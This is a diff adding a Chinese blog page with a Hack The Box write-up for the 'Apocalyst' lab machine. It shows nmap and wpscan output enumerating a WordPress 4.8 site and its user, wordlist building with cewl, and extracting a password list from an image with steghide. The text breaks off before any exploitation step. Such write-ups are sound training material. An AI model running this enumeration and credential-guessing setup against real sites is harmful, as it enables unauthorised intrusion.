@@ -1,0 +1,665 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="H0ne">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="第一步：枚举nmap进行扫描nmap -Pn -sF -sV -sC -A 10.10.11.137 1234567891011121314151617181920212223242526272829303132333435363738└─# nmap -A 10.10.10.46Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-07-16 21:28">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Apocalyst">
+<meta property="og:url" content="http://example.com/2023/04/20/HTB-Apocalyst/index.html">
+<meta property="og:site_name" content="H0ne&#39;s Blog">
+<meta property="og:description" content="第一步：枚举nmap进行扫描nmap -Pn -sF -sV -sC -A 10.10.11.137 1234567891011121314151617181920212223242526272829303132333435363738└─# nmap -A 10.10.10.46Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-07-16 21:28">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b1b8690464dc4fe0a19390cedeab010b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ece63a6cac064122a0bfe740b9e68e3d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5676df25917842c69a54e90663f9d25d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ba7494c5b9b94295b8798e5991b0316b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0f23c5ccc5f34cd9b278ec8991ace028.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/13fecd519eaa4e24b843f31c080d9971.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fff3c539ff144aa6809d9a0515edd566.png">
+<meta property="article:published_time" content="2023-04-20T15:33:27.624Z">
+<meta property="article:modified_time" content="2023-04-20T15:21:13.687Z">
+<meta property="article:author" content="H0ne">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/b1b8690464dc4fe0a19390cedeab010b.png">
+  
+  
+  
+  <title>HTB-Apocalyst - H0ne&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>H0ne&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB-Apocalyst"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-20 23:33" pubdate>
+          2023年4月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          110 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HTB-Apocalyst</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="第一步：枚举"><a href="#第一步：枚举" class="headerlink" title="第一步：枚举"></a>第一步：枚举</h2><p>nmap进行扫描<br>nmap -Pn -sF -sV -sC -A 10.10.11.137</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">└─<span class="hljs-comment"># nmap -A 10.10.10.46</span><br>Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) at <span class="hljs-number">2022</span>-07-<span class="hljs-number">16</span> <span class="hljs-number">21</span>:<span class="hljs-number">28</span> EDT<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.46</span><br>Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.21</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp <span class="hljs-built_in">open</span>  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu 4ubuntu2<span class="hljs-number">.2</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh-hostkey: <br>|   <span class="hljs-number">2048</span> fd:ab:0f:c9:<span class="hljs-number">22</span>:d5:f4:8f:7a:0a:<span class="hljs-number">29</span>:<span class="hljs-number">11</span>:b4:04:da:c9 (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">76</span>:<span class="hljs-number">92</span>:<span class="hljs-number">39</span>:0a:<span class="hljs-number">57</span>:bd:f0:03:<span class="hljs-number">26</span>:<span class="hljs-number">78</span>:c7:db:1a:<span class="hljs-number">66</span>:a5:bc (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">12</span>:<span class="hljs-number">12</span>:cf:f1:7f:be:<span class="hljs-number">43</span>:1f:d5:e6:6d:<span class="hljs-number">90</span>:<span class="hljs-number">84</span>:<span class="hljs-number">25</span>:c8:bd (ED25519)<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.18</span> ((Ubuntu))<br>|_http-generator: WordPress <span class="hljs-number">4.8</span><br>|_http-title: Apocalypse Preparation Blog<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS <span class="hljs-keyword">is</span> running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=<span class="hljs-number">7.92</span>%E=<span class="hljs-number">4</span>%D=<span class="hljs-number">7</span>/<span class="hljs-number">16</span>%OT=<span class="hljs-number">22</span>%CT=<span class="hljs-number">1</span>%CU=<span class="hljs-number">36368</span>%PV=Y%DS=<span class="hljs-number">2</span>%DC=T%G=Y%TM=62D365F<br>OS:<span class="hljs-number">9</span>%P=x86_64-pc-linux-gnu)SEQ(SP=<span class="hljs-number">106</span>%GCD=<span class="hljs-number">1</span>%ISR=10D%TI=Z%CI=I%II=I%TS=<span class="hljs-number">8</span>)OPS<br>OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1<br>OS:1NW7%O6=M539ST11)WIN(W1=<span class="hljs-number">7120</span>%W2=<span class="hljs-number">7120</span>%W3=<span class="hljs-number">7120</span>%W4=<span class="hljs-number">7120</span>%W5=<span class="hljs-number">7120</span>%W6=<span class="hljs-number">7120</span>)ECN<br>OS:(R=Y%DF=Y%T=<span class="hljs-number">40</span>%W=<span class="hljs-number">7210</span>%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=<span class="hljs-number">40</span>%S=O%A=S+%F=A<br>OS:S%RD=<span class="hljs-number">0</span>%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=<span class="hljs-number">40</span>%W=<span class="hljs-number">0</span>%S=A%A=Z%F=R%O=%RD=<span class="hljs-number">0</span>%Q=)T5(R<br>OS:=Y%DF=Y%T=<span class="hljs-number">40</span>%W=<span class="hljs-number">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class="hljs-number">0</span>%Q=)T6(R=Y%DF=Y%T=<span class="hljs-number">40</span>%W=<span class="hljs-number">0</span>%S=A%A=Z%F<br>OS:=R%O=%RD=<span class="hljs-number">0</span>%Q=)T7(R=Y%DF=Y%T=<span class="hljs-number">40</span>%W=<span class="hljs-number">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class="hljs-number">0</span>%Q=)U1(R=Y%DF=N%<br>OS:T=<span class="hljs-number">40</span>%IPL=<span class="hljs-number">164</span>%UN=<span class="hljs-number">0</span>%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=<span class="hljs-number">40</span>%CD<br>OS:=S)<br><br>Network Distance: <span class="hljs-number">2</span> hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port <span class="hljs-number">5900</span>/tcp)<br>HOP RTT       ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">211.45</span> ms <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.1</span><br><span class="hljs-number">2</span>   <span class="hljs-number">211.59</span> ms <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.46</span><br><br>OS <span class="hljs-keyword">and</span> Service detection performed. Please report <span class="hljs-built_in">any</span> incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">40.44</span> seconds<br></code></pre></td></tr></table></figure>
+<p>访问<a target="_blank" rel="noopener" href="http://10.10.10.46/">http://10.10.10.46/</a><br><img src="https://img-blog.csdnimg.cn/b1b8690464dc4fe0a19390cedeab010b.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>nmap扫描能够发现这是一个wordpress框架的网站，网站格式有点问题<br>将 apocalyst.htb 域名添加到我们的 &#x2F;etc&#x2F;hosts 文件中，&#x2F;etc目录包含与系统和服务相关的配置，hosts文件用于存储主机或dns到ip地址的解析，他提供了一种简单的方法来将主机名或dns名称与ip地址进行互配</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">echo</span> &#x27;<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">46</span> apocalyst.htb&#x27; &gt;&gt; /etc/hosts<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/ece63a6cac064122a0bfe740b9e68e3d.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5676df25917842c69a54e90663f9d25d.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>这是wordpress框架网站，用wpscan（这是专门扫描wordpress框架漏洞工具）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">wpscan --url http://<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.46</span> -e<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs python">└─<span class="hljs-comment"># wpscan --url http://10.10.10.46 -e                               </span><br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="hljs-string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="hljs-string"></span><br><span class="hljs-string">         WordPress Security Scanner by the WPScan Team</span><br><span class="hljs-string">                         Version 3.8.22</span><br><span class="hljs-string">                               </span><br><span class="hljs-string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="hljs-string">_______________________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] Updating the Database ...</span><br><span class="hljs-string">[i] Update completed.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] URL: http://10.10.10.46/ [10.10.10.46]</span><br><span class="hljs-string">[+] Started: Sun Jul 17 07:35:52 2022</span><br><span class="hljs-string"></span><br><span class="hljs-string">Interesting Finding(s):</span><br><span class="hljs-string">                                                                                                                      </span><br><span class="hljs-string">[+] Headers                                                                                                           </span><br><span class="hljs-string"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)                                                                  </span><br><span class="hljs-string"> | Found By: Headers (Passive Detection)                                                                              </span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] XML-RPC seems to be enabled: http://10.10.10.46/xmlrpc.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress readme found: http://10.10.10.46/readme.html</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Upload directory has listing enabled: http://10.10.10.46/wp-content/uploads/</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://10.10.10.46/wp-cron.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 60%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="hljs-string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).</span><br><span class="hljs-string"> | Found By: Emoji Settings (Passive Detection)</span><br><span class="hljs-string"> |  - http://10.10.10.46/, Match: &#x27;</span>wp-includes\/js\/wp-emoji-release.<span class="hljs-built_in">min</span>.js?ver=<span class="hljs-number">4.8</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string"> | Confirmed By: Meta Generator (Passive Detection)</span><br><span class="hljs-string"> |  - http://10.10.10.46/, Match: &#x27;</span>WordPress <span class="hljs-number">4.8</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] The main theme could not be detected.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No plugins Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Known Locations - Time: 00:00:23 &lt;======================================&gt; (472 / 472) 100.00% Time: 00:00:23</span><br><span class="hljs-string">[+] Checking Theme Versions (via Passive and Aggressive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No themes Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Known Locations - Time: 00:04:01 &lt;====================================&gt; (2568 / 2568) 100.00% Time: 00:04:01</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Timthumbs Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Config Backups - Time: 00:00:06 &lt;=======================================&gt; (137 / 137) 100.00% Time: 00:00:06</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Config Backups Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating DB Exports (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking DB Exports - Time: 00:00:03 &lt;=============================================&gt; (71 / 71) 100.00% Time: 00:00:03</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No DB Exports Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)</span><br><span class="hljs-string"> Brute Forcing Attachment IDs - Time: 00:00:05 &lt;==================================&gt; (100 / 100) 100.00% Time: 00:00:05</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] Medias(s) Identified:</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] http://10.10.10.46/?attachment_id=11</span><br><span class="hljs-string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] http://10.10.10.46/?attachment_id=12</span><br><span class="hljs-string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Brute Forcing Author IDs - Time: 00:00:01 &lt;========================================&gt; (10 / 10) 100.00% Time: 00:00:01</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] User(s) Identified:</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] falaraki</span><br><span class="hljs-string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Sun Jul 17 07:40:49 2022</span><br><span class="hljs-string">[+] Requests Done: 3417</span><br><span class="hljs-string">[+] Cached Requests: 8</span><br><span class="hljs-string">[+] Data Sent: 918.129 KB</span><br><span class="hljs-string">[+] Data Received: 19.437 MB</span><br><span class="hljs-string">[+] Memory used: 262.105 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:04:56</span><br><span class="hljs-string">                            </span><br></code></pre></td></tr></table></figure>
+<p>发现了一个用户名，falaraki，然后用cewl创建一个目录词表，然后使用我们创建的词表使用dirbuster。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cewl http://<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.46</span> &gt; H0ne.txt  <br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/ba7494c5b9b94295b8798e5991b0316b.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>发现Rightiousness响应长度跟其他不一样，<br><img src="https://img-blog.csdnimg.cn/0f23c5ccc5f34cd9b278ec8991ace028.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>访问网址，发现是一张照片<br><img src="https://img-blog.csdnimg.cn/13fecd519eaa4e24b843f31c080d9971.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>将文件下载下来，然后用steghind提取信息</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">wget http://<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.46</span>/Rightiousness/image.jpg<br>steghide extract -sf image.jpg<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">└─<span class="hljs-comment"># steghide extract -sf image.jpg</span><br>Enter passphrase: <br>wrote extracted data to <span class="hljs-string">&quot;list.txt&quot;</span>.<br></code></pre></td></tr></table></figure>
+<p>得到list.txt，再次使用wpscan。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 